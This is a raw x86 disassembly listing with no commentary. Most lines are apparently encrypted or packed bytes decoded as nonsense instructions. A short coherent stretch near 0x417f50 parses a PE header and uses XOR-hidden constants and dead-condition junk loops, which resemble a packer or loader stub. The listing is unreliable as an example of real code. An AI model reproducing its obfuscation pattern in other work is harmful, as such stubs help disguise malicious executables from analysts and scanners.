  41792f:	mov    fs,WORD PTR [eax+0x24]
  417932:	call   0xf018:0x7c058ba3
  417939:	add    dh,BYTE PTR [edi+0x2f]
  41793c:	inc    DWORD PTR [edi+ebp*2-0x29578b9e]
  417943:	les    esi,FWORD PTR [edi+eax*4-0x19]
  417947:	loopne 0x41790f
  417949:	in     eax,dx
  41794a:	(bad)  
  41794b:	outs   dx,BYTE PTR ds:[esi]
  41794c:	inc    DWORD PTR [edx-0xc]
  41794f:	and    DWORD PTR [edx],0xc9d079b7
  417955:	jl     0x417941
  417957:	and    DWORD PTR [eax+0x7f],ecx
  41795a:	jbe    0x4178e9
  41795c:	cmc    
  41795d:	std    
  41795e:	mov    DWORD PTR [ecx],0x77e22ca
  417964:	or     al,0x8f
  417966:	push   ds
  417967:	xchg   edx,eax
  417968:	mov    esi,0xbaee5349
  41796d:	inc    esp
  41796e:	cmp    dl,ah
  417970:	jbe    0x4179dd
  417972:	jne    0x41791e
  417974:	gs mov esp,0x6a04cbf8
  41797a:	sub    al,BYTE PTR [ecx+0x37]
  41797d:	cmp    ecx,ebp
  41797f:	jbe    0x41793c
  417981:	arpl   WORD PTR [eax+0x5a],di
  417984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417985:	push   0xffffffba
  417987:	mov    eax,0x82486539
  41798c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41798d:	or     DWORD PTR [ebp-0x6caeeb01],edi
  417993:	sbb    DWORD PTR [edx],ecx
  417995:	(bad)  [edi-0x4e]
  417998:	cmp    eax,ebp
  41799a:	jl     0x417949
  41799c:	(bad)  [ebx-0x7384208c]
  4179a2:	fwait
  4179a3:	inc    eax
  4179a4:	jp     0x4179e7
  4179a6:	ja     0x417a05
  4179a8:	aaa    
  4179a9:	mov    ss,WORD PTR [edx]
  4179ab:	test   al,0x2f
  4179ad:	or     ebx,DWORD PTR [edx-0x78]
  4179b0:	dec    esp
  4179b1:	ret    0x4550
  4179b4:	pop    eax
  4179b5:	(bad)  [esi+0x3f]
  4179b8:	push   eax
  4179b9:	loope  0x417a11
  4179bb:	jmp    0xdcc78d74
  4179c0:	xchg   ebx,eax
  4179c1:	add    dh,BYTE PTR [edx-0x9]
  4179c4:	sbb    DWORD PTR [eax-0x6],esi
  4179c7:	sub    eax,0x5b21c4b6
  4179cc:	pop    eax
  4179cd:	push   cs
  4179ce:	and    eax,0xdcc6708a
  4179d3:	sbb    DWORD PTR [eax+0x1a790934],esp
  4179d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179da:	cmp    BYTE PTR [esi-0x71],ah
  4179dd:	push   cs
  4179de:	aaa    
  4179df:	dec    edx
  4179e0:	and    BYTE PTR [ebx+edx*4+0x4e],0xe5
  4179e5:	in     eax,dx
  4179e6:	xor    al,0xd4
  4179e8:	stos   DWORD PTR es:[edi],eax
  4179e9:	fwait
  4179ea:	mov    ds:0x80f9980b,al
  4179ef:	push   esp
  4179f0:	aas    
  4179f1:	int3   
  4179f2:	imul   esp,DWORD PTR [ecx+0x12],0xdab87720
  4179f9:	xchg   BYTE PTR [edi+0x6c],ch
  4179fc:	sbb    BYTE PTR [ebp+0x7c],ch
  4179ff:	fild   QWORD PTR [edx+0x4af8dcbf]
  417a05:	mov    esp,0xdac79da0
  417a0a:	scas   al,BYTE PTR es:[edi]
  417a0b:	jle    0x4179aa
  417a0d:	mov    ebp,0xe71c01e6
  417a12:	(bad)  
  417a13:	cdq    
  417a14:	mov    ecx,0x154bf96e
  417a19:	iret   
  417a1a:	enter  0xe3f9,0xef
  417a1e:	cmp    edi,ebx
  417a20:	popa   
  417a21:	lea    esi,[edx+0x78]
  417a24:	sub    ch,BYTE PTR [edi+0x3b26e8ed]
  417a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a2b:	hlt    
  417a2c:	fimul  WORD PTR ds:0x3c21fb85
  417a32:	mov    esp,0x6001f5ba
  417a37:	mov    ebp,0x34d31961
  417a3c:	repnz rcr DWORD PTR [edx-0x4c9460be],1
  417a43:	xchg   BYTE PTR [ecx-0x77620dca],dl
  417a49:	out    dx,al
  417a4a:	mov    edx,DWORD PTR [edi-0x1d]
  417a4d:	imul   ebx,DWORD PTR [esi],0xfffffff4
  417a50:	shl    edi,1
  417a52:	add    cl,bh
  417a54:	imul   ebx,DWORD PTR [esi-0x3756f609],0xffffffac
  417a5b:	inc    ebx
  417a5c:	aas    
  417a5d:	dec    ebx
  417a5e:	and    al,0x29
  417a60:	int3   
  417a61:	outs   dx,DWORD PTR ds:[esi]
  417a62:	or     ebx,esi
  417a64:	adc    bh,BYTE PTR [ecx]
  417a66:	rol    DWORD PTR [ebx+edx*2],cl
  417a69:	aad    0x52
  417a6b:	in     eax,dx
  417a6c:	pop    eax
  417a6d:	cmc    
  417a6e:	mov    cl,0xd8
  417a70:	pop    ebp
  417a71:	ficom  WORD PTR [ebx+0x27]
  417a74:	push   esi
  417a75:	jp     0x417acc
  417a77:	int3   
  417a78:	jbe    0x417a25
  417a7a:	sub    eax,0x628e63f
  417a7f:	iret   
  417a80:	pop    edx
  417a81:	sbb    DWORD PTR [ecx-0x43],esi
  417a84:	test   al,0xf2
  417a86:	jge    0x417a6f
  417a88:	aas    
  417a89:	mov    ds:0x44bdc648,al
  417a8e:	loop   0x417ab3
  417a90:	pushf  
  417a91:	mov    al,0x21
  417a93:	jl     0x417a5f
  417a95:	mov    al,0x7e
  417a97:	out    0x82,al
  417a99:	cmp    esp,DWORD PTR [edx]
  417a9b:	sub    eax,0xe8031a9d
  417aa0:	ds adc dl,ah
  417aa3:	jno    0x417ad3
  417aa5:	div    BYTE PTR cs:[eax+ecx*2+0x5b]
  417aaa:	or     eax,0xf6208810
  417aaf:	cdq    
  417ab0:	jp     0x417a62
  417ab2:	push   es
  417ab3:	arpl   WORD PTR [ebx+0x5],di
  417ab6:	jmp    0x15bb:0xb51d5628
  417abd:	mov    ebp,0xcf1aa7fb
  417ac2:	call   0xd660:0x66087148
  417ac9:	dec    ebx
  417aca:	daa    
  417acb:	or     al,0x37
  417acd:	lods   eax,DWORD PTR ds:[esi]
  417ace:	cmp    eax,0xf5aea3fc
  417ad3:	push   esp
  417ad4:	and    al,0x35
  417ad6:	(bad)  
  417ad7:	cmp    al,0x2a
  417ad9:	jg     0x417a9e
  417adb:	mov    dl,0xe6
  417add:	and    al,0x90
  417adf:	mov    dh,BYTE PTR [ecx]
  417ae1:	xchg   BYTE PTR [eax+0xab229a5],al
  417ae7:	retf   
  417ae8:	aas    
  417ae9:	inc    edi
  417aea:	arpl   si,cx
  417aec:	es push ecx
  417aee:	inc    edi
  417aef:	and    eax,0xabe11d8c
  417af4:	push   ebp
  417af5:	ja     0x417ab6
  417af7:	outs   dx,BYTE PTR ds:[esi]
  417af8:	in     eax,0x16
  417afa:	cmc    
  417afb:	pop    ss
  417afc:	push   esi
  417afd:	mov    BYTE PTR [ebp+0x54d1f439],ch
  417b03:	xchg   esi,eax
  417b04:	mov    bh,0x77
  417b06:	test   eax,0x77db0a3b
  417b0b:	mul    DWORD PTR [esi]
  417b0d:	cld    
  417b0e:	adc    eax,0xf213558d
  417b13:	xchg   edi,eax
  417b14:	mov    DWORD PTR [edx-0x1],esp
  417b17:	or     edi,esi
  417b19:	add    al,0xd4
  417b1b:	popa   
  417b1c:	pop    edx
  417b1d:	imul   edi,DWORD PTR [eax+esi*8-0x76477814],0xb3216ecd
  417b28:	psubsw mm6,QWORD PTR es:[edi]
  417b2c:	fwait
  417b2d:	mov    eax,0xe17fa456
  417b32:	test   al,0xcf
  417b34:	lock mov ds:0x5752a4f1,eax
  417b3a:	jmp    FWORD PTR [ebp+edi*2+0x7151be1e]
  417b41:	or     al,0x36
  417b43:	jne    0x417b0a
  417b45:	mov    al,0x3
  417b47:	or     BYTE PTR [esi+0x380422f4],dh
  417b4d:	cmp    al,0xff
  417b4f:	and    eax,0xb370d9aa
  417b54:	cmp    al,0xd0
  417b56:	iret   
  417b57:	jb     0x417b4f
  417b59:	clc    
  417b5a:	js     0x417af4
  417b5c:	fsubr  st(7),st
  417b5e:	jbe    0x417bb1
  417b60:	iret   
  417b61:	mov    ?,WORD PTR [edi]
  417b63:	lods   al,BYTE PTR ds:[esi]
  417b64:	ds gs loopne 0x417b31
  417b68:	pop    eax
  417b69:	jb     0x417af2
  417b6b:	push   ecx
  417b6c:	(bad)  
  417b6d:	mov    es,WORD PTR [esi+0x3d7027ee]
  417b73:	pop    esi
  417b74:	jbe    0x417ba3
  417b76:	mov    WORD PTR [edi+0x6a9b676c],cs
  417b7c:	push   edx
  417b7d:	add    eax,0x4c62c648
  417b82:	xor    eax,0x32f2ee9f
  417b87:	js     0x417b6c
  417b89:	mov    bh,0xa3
  417b8b:	iret   
  417b8c:	xor    al,0x44
  417b8e:	xchg   ebp,eax
  417b8f:	jle    0x417b29
  417b91:	mov    edi,0x9f733211
  417b96:	dec    ecx
  417b97:	scas   al,BYTE PTR es:[edi]
  417b98:	mov    ebp,0x64487e06
  417b9d:	mov    al,0xa0
  417b9f:	dec    ebx
  417ba0:	pop    edx
  417ba1:	cmp    ah,bl
  417ba3:	fimul  WORD PTR [esi+0x10be7834]
  417ba9:	push   edx
  417baa:	cld    
  417bab:	adc    DWORD PTR ds:0xce82e628,edx
  417bb1:	push   ebx
  417bb2:	dec    ebp
  417bb3:	jecxz  0x417c20
  417bb5:	test   al,0x49
  417bb7:	pop    esi
  417bb8:	pop    edi
  417bb9:	int    0xe3
  417bbb:	pop    eax
  417bbc:	in     al,dx
  417bbd:	imul   esp,DWORD PTR [ecx],0xf561fce0
  417bc3:	adc    eax,0xbdf5c4af
  417bc8:	mov    ecx,edi
  417bca:	lods   eax,DWORD PTR ds:[esi]
  417bcb:	nop
  417bcc:	jbe    0x417b7b
  417bce:	loop   0x417bc5
  417bd0:	dec    ebx
  417bd1:	push   eax
  417bd2:	jo     0x417b5a
  417bd4:	dec    ecx
  417bd5:	cdq    
  417bd6:	call   0x46a6:0xfad33c5b
  417bdd:	inc    edx
  417bde:	fidiv  DWORD PTR [edi]
  417be0:	mov    eax,gs
  417be2:	adc    DWORD PTR [esi-0x65],esi
  417be5:	jle    0x417b69
  417be7:	jb     0x417bf3
  417be9:	cmp    eax,0x93248f6f
  417bee:	sub    eax,0x110770e1
  417bf3:	cdq    
  417bf4:	lahf   
  417bf5:	jnp    0x417bee
  417bf7:	iret   
  417bf8:	dec    ebp
  417bf9:	lds    eax,FWORD PTR [ebp+eax*8-0x65]
  417bfd:	inc    edi
  417bfe:	mov    esi,0xa7139a31
  417c03:	and    eax,0xadd2ab4a
  417c08:	out    0x9d,eax
  417c0a:	pop    eax
  417c0b:	mov    ebp,0xf508507d
  417c10:	lock xchg ecx,eax
  417c12:	test   al,0x13
  417c14:	lods   eax,DWORD PTR ds:[esi]
  417c15:	or     DWORD PTR [eax+0x7d1aab42],edx
  417c1b:	jnp    0x417c21
  417c1d:	dec    ebx
  417c1e:	jg     0x417bc6
  417c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c21:	adc    ecx,DWORD PTR [esi]
  417c23:	repnz (bad) 
  417c25:	jns    0x417c3b
  417c27:	sbb    al,0xa5
  417c29:	cmp    BYTE PTR [ebp+0x4ded8391],bl
  417c2f:	div    DWORD PTR [eax-0x244a9c60]
  417c35:	push   ebx
  417c36:	push   0xffffffb3
  417c38:	push   0x18f70077
  417c3d:	fwait
  417c3e:	dec    ecx
  417c3f:	pop    ecx
  417c40:	mov    ebp,0xd36db6bd
  417c45:	xor    eax,0x60ff1e1e
  417c4a:	gs mov bh,0x3
  417c4d:	mov    dh,dh
  417c4f:	(bad)  
  417c50:	sti    
  417c51:	or     DWORD PTR [edx-0x7c],0x57
  417c55:	xlat   BYTE PTR ds:[ebx]
  417c56:	repnz sbb cl,bl
  417c59:	data16 adc al,0x9b
  417c5c:	cdq    
  417c5d:	dec    bl
  417c5f:	mov    BYTE PTR [edx+0x1c],dh
  417c62:	mov    cl,0xf8
  417c64:	jmp    0x82e7fb5b
  417c69:	imul   edx,DWORD PTR [ecx+0x77],0xbd1167e3
  417c70:	in     eax,dx
  417c71:	jo     0x417c3f
  417c73:	jns    0x417c2d
  417c75:	jb     0x417cf5
  417c77:	jo     0x417cc0
  417c79:	outs   dx,BYTE PTR ds:[esi]
  417c7a:	sub    eax,0x5f66d400
  417c7f:	pusha  
  417c80:	xchg   DWORD PTR [edi+eax*1],ebp
  417c83:	and    al,0x61
  417c85:	shl    DWORD PTR [edx+0x262eb63c],0x59
  417c8c:	dec    ebx
  417c8d:	les    esp,FWORD PTR [ecx-0x27]
  417c90:	xchg   ecx,eax
  417c91:	in     al,0x31
  417c93:	ss ins BYTE PTR es:[edi],dx
  417c95:	adc    cl,BYTE PTR [esi]
  417c97:	lods   eax,DWORD PTR ds:[esi]
  417c98:	xor    edi,DWORD PTR [ecx]
  417c9a:	and    al,ah
  417c9c:	cli    
  417c9d:	ja     0x417ce7
  417c9f:	shl    BYTE PTR [eax-0x2811d094],0xb1
  417ca6:	popa   
  417ca7:	pop    esi
  417ca8:	inc    ebx
  417ca9:	cld    
  417caa:	sub    ah,bh
  417cac:	ins    DWORD PTR es:[edi],dx
  417cad:	pop    edi
  417cae:	cwde   
  417caf:	push   esp
  417cb0:	sbb    al,0x89
  417cb2:	adc    BYTE PTR [ebx+0x1289d598],dl
  417cb8:	and    DWORD PTR [edi],esi
  417cba:	adc    al,0xf
  417cbc:	push   esp
  417cbd:	test   DWORD PTR [eax],esp
  417cbf:	lock and dl,BYTE PTR [ebx]
  417cc2:	repz adc ch,BYTE PTR [ebx-0x2e6603fc]
  417cc9:	mov    eax,0x177006b3
  417cce:	xchg   ebp,eax
  417ccf:	jg     0x417c80
  417cd1:	jp     0x417cce
  417cd3:	pop    ecx
  417cd4:	inc    eax
  417cd5:	mov    dh,0xd2
  417cd7:	inc    ebp
  417cd8:	inc    esi
  417cd9:	gs (bad) 
  417cdb:	mov    dh,BYTE PTR [edx+0x59a6625f]
  417ce1:	cmp    eax,DWORD PTR [eax-0x40]
  417ce4:	mov    ebp,0xa35f1c39
  417ce9:	loopne 0x417ca4
  417ceb:	mov    esp,ebp
  417ced:	mov    BYTE PTR [edx-0x686b78d0],ch
  417cf3:	inc    ebp
  417cf4:	mov    eax,0x7558a38a
  417cf9:	pop    edx
  417cfa:	jns    0x417c8b
  417cfc:	mov    ch,0xf3
  417cfe:	int3   
  417cff:	xor    al,BYTE PTR [eax+0x590f164b]
  417d05:	mov    ebp,0x2a563d1c
  417d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d0b:	mov    cl,0x4b
  417d0d:	or     edi,DWORD PTR [edi-0x6]
  417d10:	xchg   esi,eax
  417d11:	nop
  417d12:	jno    0x417d02
  417d14:	arpl   WORD PTR [ebp-0x37],cx
  417d17:	add    ah,al
  417d19:	pop    ebp
  417d1a:	sbb    al,0x7b
  417d1c:	pop    ds
  417d1d:	ss test eax,0xc2300169
  417d23:	sbb    DWORD PTR [edi+eiz*8-0x7d],edi
  417d27:	loop   0x417d67
  417d29:	mov    eax,0x17afa9ef
  417d2e:	push   ebx
  417d2f:	xor    ch,ah
  417d31:	inc    esi
  417d32:	push   0xffffffe9
  417d34:	aad    0x12
  417d36:	sub    BYTE PTR [esi-0x23],cl
  417d39:	int3   
  417d3a:	fxch   st(7)
  417d3c:	sub    esp,0xffffffb1
  417d3f:	xchg   ebx,eax
  417d40:	jmp    0x417d96
  417d42:	push   ebp
  417d43:	sub    eax,0x8167474f
  417d48:	pop    edi
  417d49:	mov    eax,0xa359f84d
  417d4e:	int    0xbd
  417d50:	sub    al,bh
  417d52:	loop   0x417d5c
  417d54:	push   eax
  417d55:	fs or  eax,0x295110ed
  417d5b:	iret   
  417d5c:	sub    ecx,DWORD PTR [ecx]
  417d5e:	or     BYTE PTR [edx-0x78],dl
  417d61:	inc    ebx
  417d62:	test   cl,0xcf
  417d65:	mov    ecx,0x297082a
  417d6a:	mov    esi,0xc8a295b5
  417d6f:	push   ss
  417d70:	rol    BYTE PTR [edx-0x2a],0x3a
  417d74:	fcom   DWORD PTR [ecx-0x5e67476b]
  417d7a:	jno    0x417d77
  417d7c:	ret    
  417d7d:	ret    
  417d7e:	adc    DWORD PTR [edi],esi
  417d80:	(bad)  
  417d81:	cld    
  417d82:	mov    ch,0x7a
  417d84:	pop    esi
  417d85:	mov    ah,0xa7
  417d87:	mov    edi,0xf6df501a
  417d8c:	es push eax
  417d8e:	fidivr DWORD PTR [ecx+ebx*8]
  417d91:	mov    esi,0xdb9bd73c
  417d96:	enter  0x5304,0x3e
  417d9a:	aas    
  417d9b:	mov    al,0x2
  417d9d:	and    BYTE PTR [edx-0x447170df],0xd5
  417da4:	aam    0x32
  417da6:	in     al,0x73
  417da8:	sub    al,0x59
  417daa:	dec    edi
  417dab:	cwde   
  417dac:	repnz and BYTE PTR [ecx+0x2c],0x75
  417db1:	mov    esi,0x42b7f338
  417db6:	inc    eax
  417db7:	mov    BYTE PTR [eax],ch
  417db9:	xchg   esi,eax
  417dba:	sahf   
  417dbb:	dec    ebp
  417dbc:	mov    dl,0xa
  417dbe:	stos   BYTE PTR es:[edi],al
  417dbf:	outs   dx,DWORD PTR ds:[esi]
  417dc0:	rol    DWORD PTR [edi+0x13],1
  417dc3:	and    eax,DWORD PTR [ebx+0x77fda32a]
  417dc9:	adc    BYTE PTR [ebp+0x58],ch
  417dcc:	adc    ah,dh
  417dce:	jnp    0x417e3d
  417dd0:	mov    esi,0x10e2171d
  417dd5:	imul   ebp,DWORD PTR [ebx-0x19fc7084],0xdde0bc7d
  417ddf:	mov    esi,ds
  417de1:	int    0x48
  417de3:	mov    DWORD PTR es:[edx+edx*2],ebx
  417de7:	cs mov esp,0xea4f5ba9
  417ded:	std    
  417dee:	imul   ebp,DWORD PTR [edi],0x66f59958
  417df4:	mov    eax,ds:0x6e5e1b4b
  417df9:	inc    edx
  417dfa:	(bad)  [ecx-0x2816bdc0]
  417e00:	mov    ah,BYTE PTR [ebp+0x1cea22b4]
  417e06:	outs   dx,DWORD PTR ds:[esi]
  417e07:	lahf   
  417e08:	pop    edi
  417e09:	(bad)  
  417e0a:	adc    al,0xd5
  417e0c:	xor    dh,BYTE PTR [ecx+0x6c]
  417e0f:	mov    WORD PTR [edx-0x7d],ss
  417e12:	js     0x417e0c
  417e14:	cmp    edx,ecx
  417e16:	sbb    eax,DWORD PTR [edx]
  417e18:	jmp    0x417df1
  417e1a:	push   es
  417e1b:	sub    cl,BYTE PTR [edx]
  417e1d:	pushf  
  417e1e:	adc    BYTE PTR [ebp+0x4a07c896],bl
  417e24:	test   bh,al
  417e26:	dec    edx
  417e27:	and    eax,0xd96d4323
  417e2c:	outs   dx,DWORD PTR ds:[esi]
  417e2d:	cdq    
  417e2e:	into   
  417e2f:	mov    bl,0xc
  417e31:	shr    DWORD PTR [ebx+0xb],0xc2
  417e35:	lds    edx,FWORD PTR [eax+0x79]
  417e38:	lds    edx,FWORD PTR [edx+eiz*1+0x1e]
  417e3c:	sub    ecx,0x35
  417e3f:	jnp    0x417e31
  417e41:	mov    dh,0xcb
  417e43:	inc    ebx
  417e44:	lock rcr al,cl
  417e47:	fwait
  417e48:	inc    BYTE PTR [eax-0x39]
  417e4b:	in     al,0x8
  417e4d:	mov    esp,DWORD PTR [edi]
  417e4f:	call   0x6050:0x844de120
  417e56:	rcr    DWORD PTR [esi+0x46],0x78
  417e5a:	dec    eax
  417e5b:	xor    eax,0x22dd9e0a
  417e60:	arpl   WORD PTR [ecx-0x2a785b01],si
  417e66:	imul   ebp,ecx,0x42
  417e69:	add    al,0x66
  417e6b:	mov    bl,0x79
  417e6d:	sti    
  417e6e:	fld    TBYTE PTR [ebx]
  417e70:	push   ecx
  417e71:	dec    eax
  417e72:	adc    DWORD PTR [bx+si],ebx
  417e75:	mov    ch,0x3b
  417e77:	stos   BYTE PTR es:[edi],al
  417e78:	and    eax,0x5a18fe8a
  417e7d:	push   esp
  417e7e:	jge    0x417e4c
  417e80:	or     eax,0x404435c4
  417e85:	xchg   ebp,eax
  417e86:	dec    esi
  417e87:	or     DWORD PTR [ebx],esi
  417e89:	loop   0x417e3a
  417e8b:	jne    0x417e47
  417e8d:	jae    0x417e28
  417e8f:	xchg   ebp,eax
  417e90:	sbb    eax,0x22d9b806
  417e95:	imul   edi,DWORD PTR [eax+esi*1-0x4c],0x1d413c55
  417e9d:	scas   eax,DWORD PTR es:[edi]
  417e9e:	fldenv [ecx-0x61]
  417ea1:	aam    0x41
  417ea3:	xchg   edi,eax
  417ea4:	sbb    al,0x39
  417ea6:	mov    BYTE PTR [edx-0x51],dh
  417ea9:	push   esi
  417eaa:	fnstsw WORD PTR [ecx]
  417eac:	arpl   WORD PTR [edx-0x5bc5a76b],bx
  417eb2:	in     eax,0xd1
  417eb4:	mov    eax,ds:0x7ec33681
  417eb9:	hlt    
  417eba:	ds xchg esi,eax
  417ebc:	inc    edx
  417ebd:	mov    ecx,0x84fbbe70
  417ec2:	repz dec eax
  417ec4:	inc    edi
  417ec5:	fstp   TBYTE PTR [ebx-0x2f]
  417ec8:	(bad)  
  417ec9:	bound  ecx,QWORD PTR [ebx-0x308aaa12]
  417ecf:	dec    eax
  417ed0:	cmp    al,0xb9
  417ed2:	sar    BYTE PTR [eax+esi*4+0x32],cl
  417ed6:	jle    0x417eea
  417ed8:	mov    al,0xb2
  417eda:	sbb    dh,BYTE PTR [esi]
  417edc:	aas    
  417edd:	stos   DWORD PTR es:[edi],eax
  417ede:	ret    
  417edf:	in     eax,0x6f
  417ee1:	in     al,0xef
  417ee3:	xor    DWORD PTR [ecx],eax
  417ee5:	mov    cl,0xb2
  417ee7:	push   es
  417ee8:	add    al,0x6b
  417eea:	(bad)  
  417eeb:	popa   
  417eec:	dec    BYTE PTR [ebp+0x44]
  417eef:	ret    0x523d
  417ef2:	cli    
  417ef3:	jmp    0x417e9c
  417ef5:	pop    ebx
  417ef6:	ja     0x417e81
  417ef8:	pop    edx
  417ef9:	icebp  
  417efa:	shl    BYTE PTR [edx],0x77
  417efd:	xor    dl,BYTE PTR [ecx+0x5ea9b8c3]
  417f03:	mov    ecx,0xb5a26cc0
  417f08:	sub    esp,DWORD PTR [esi]
  417f0a:	xor    BYTE PTR [esi-0x2cee9b6f],ch
  417f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f11:	fcom   DWORD PTR [edi+0xd]
  417f14:	mov    esi,0xa2911300
  417f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f1a:	adc    al,0x10
  417f1c:	ins    BYTE PTR es:[edi],dx
  417f1d:	aas    
  417f1e:	in     eax,0x10
  417f20:	les    eax,FWORD PTR [edi+0x8a40d4]
  417f26:	add    DWORD PTR ds:0x429004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x41fffb
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d25c
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	fld    DWORD PTR [edx]
  418115:	xor    DWORD PTR [ebp+edi*8-0x329d9edc],esp
  41811c:	pop    edi
  41811d:	bound  esp,QWORD PTR [edx-0x16]
  418120:	push   ecx
  418121:	cmc    
  418122:	mov    dh,0xfc
  418124:	cmp    ch,BYTE PTR [edi-0x21]
  418127:	sahf   
  418128:	cwde   
  418129:	xor    bh,cl
  41812b:	cdq    
  41812c:	lds    edi,FWORD PTR [eax-0x70]
  41812f:	cmp    eax,0xa4efd5ba
  418134:	in     al,0xa1
  418136:	push   ds
  418137:	and    al,0x94
  418139:	fld    TBYTE PTR [ebp-0x5d]
  41813c:	repz icebp 
  41813e:	inc    esp
  41813f:	int    0x7a
  418141:	jmp    0x418115
  418143:	je     0x4181b0
  418145:	or     ebx,DWORD PTR [ebx+edi*2-0x72]
  418149:	mov    eax,ds:0x8889c0a1
  41814e:	pop    edi
  41814f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418150:	jg     0x4181ab
  418152:	cld    
  418153:	ror    BYTE PTR [edi+0x5d],1
  418156:	jnp    0x4181a7
  418158:	arpl   WORD PTR [edi],bx
  41815a:	mov    ah,0x24
  41815c:	adc    esp,DWORD PTR [ebx+0x68f5eb1a]
  418162:	(bad)  
  418163:	stos   BYTE PTR es:[edi],al
  418164:	or     esp,DWORD PTR [edx+0x79]
  418167:	xor    esi,DWORD PTR [esi-0x1e]
  41816a:	sub    ah,dh
  41816c:	adc    BYTE PTR [edx],ah
  41816e:	or     eax,0x3bf416bc
  418173:	fnstsw WORD PTR [edi]
  418175:	cld    
  418176:	xchg   esi,eax
  418177:	push   0xfffffff9
  418179:	mov    DWORD PTR [edx+0x5c],ebx
  41817c:	or     ecx,DWORD PTR [ebx+0x13845760]
  418182:	mov    eax,0x2ed4272c
  418187:	or     BYTE PTR [eax],bl
  418189:	xchg   ebx,eax
  41818a:	mov    eax,ds:0x13c4222b
  41818f:	fmul   QWORD PTR [edx]
  418191:	pop    edi
  418192:	cld    
  418193:	and    DWORD PTR [ecx-0x75],ebp
  418196:	outs   dx,BYTE PTR cs:[esi]
  418198:	cmp    al,0xca
